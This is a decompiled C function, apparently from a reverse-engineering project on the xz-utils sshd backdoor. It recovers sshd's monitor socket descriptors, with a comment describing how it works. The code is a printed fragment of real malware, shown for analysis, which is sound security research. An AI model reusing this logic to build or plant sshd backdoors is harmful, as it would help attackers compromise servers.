// /home/kali/xzre-ghidra/xzregh/107C60_sshd_get_client_socket.c
// Function: sshd_get_client_socket @ 0x107C60
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_client_socket(global_context_t * ctx, int * pSocket, int socket_index, SocketMode socket_direction)


/*
 * AutoDoc: Prefers the recovered monitor struct when one is available: it selects monitor->m_recvfd for DIR_WRITE and
 * monitor->m_sendfd for DIR_READ, verifies the descriptor by issuing a zero-length `read()` that tolerates EINTR, and
 * returns it on success. If the monitor pointer is unmapped or the fd is dead/EBADF it falls back to
 * `sshd_get_usable_socket`, letting callers still obtain a socket handle by index.
 */

#include "xzre_types.h"

BOOL sshd_get_client_socket
               (global_context_t *ctx,int *pSocket,int socket_index,SocketMode socket_direction)

{
  monitor *monitor_candidate;
  BOOL range_ok;
  ssize_t read_result;
  int *errno_ptr;
  libc_imports_t *imports;
  int socket_fd;
  u8 read_probe_buf[9];
  
  if (((ctx == (global_context_t *)0x0) ||
      (imports = ctx->libc_imports, imports == (libc_imports_t *)0x0)) || (pSocket == (int *)0x0)) {
    return FALSE;
  }
  if (ctx->monitor_struct_slot != (monitor **)0x0) {
    monitor_candidate = *ctx->monitor_struct_slot;
    range_ok = is_range_mapped((u8 *)monitor_candidate,4,ctx);
    if (range_ok != FALSE) {
      if (socket_direction == DIR_WRITE) {
        socket_fd = monitor_candidate->m_recvfd;
      }
      else {
        if (socket_direction != DIR_READ) {
          return FALSE;
        }
        socket_fd = monitor_candidate->m_sendfd;
      }
      read_probe_buf[0] = 0;
      imports = ctx->libc_imports;
      if (((-1 < socket_fd) && (imports != (libc_imports_t *)0x0)) &&
         ((imports->read != (pfn_read_t)0x0 &&
          (imports->__errno_location != (pfn___errno_location_t)0x0)))) {
        do {
          read_result = (*imports->read)(socket_fd,read_probe_buf,0);
          errno_ptr = (*imports->__errno_location)();
          if (-1 < (int)read_result) goto LAB_00107d34;
        } while (*errno_ptr == 4);
        if (*errno_ptr != 9) {
LAB_00107d34:
          *pSocket = socket_fd;
          return TRUE;
        }
      }
    }
    imports = ctx->libc_imports;
  }
  range_ok = sshd_get_usable_socket(pSocket,socket_index,imports);
  return range_ok;
}

